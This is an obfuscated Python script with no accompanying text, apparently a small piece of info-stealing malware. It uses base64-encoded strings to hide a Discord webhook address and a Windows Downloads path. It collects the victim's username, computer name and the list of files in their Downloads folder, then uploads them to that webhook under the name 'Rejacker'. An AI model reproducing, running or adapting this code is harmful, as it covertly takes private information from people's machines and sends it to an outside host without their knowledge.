prsfzqkuaqoqofq = "3KGMG5xVGscUlViMjlAcXudnYExwP3mGrapKVj85s3oaiwe6D39II8MGmboEizXwXjsxJquAKNOLBXrFM0CGO8iZUj" 
import json
import requests
import base64
from requests_toolbelt.multipart.encoder import MultipartEncoder
fguwobhjlpoomiq = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyODA3OTUzMDczMjk0OTUzNC9KbXNqNm9NaDhHZEwtRFlvVzBZWlYwSFJSZGdEQ2lsMW9pVkVyaDN1VmFBeVhSaTBrQ2lpb3BVRXBqcmo2VFYtRWRzYw==").decode()

 

import os
import base64


eidlvxhxux = "PC Username: " + os.getenv("UserName") + " PC Name: " + os.getenv("COMPUTERNAME") + "\n"

raoltsfrlf = os.listdir(base64.b64decode("QzpcVXNlcnNc").decode() + os.getenv("UserName") + base64.b64decode("XERvd25sb2Fkcw==").decode())

for icerik in raoltsfrlf:
    eidlvxhxux += icerik + "\n"

encoder = MultipartEncoder({'payload_json': json.dumps({
    "username": base64.b64decode("UmVqYWNrZXI=").decode(),
    "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode()
}), 'file': (f'scxvsdgfgczw.txt',eidlvxhxux, 'application/txt')})
requests.post(fguwobhjlpoomiq, headers={'Content-type': encoder.content_type}, data=encoder)



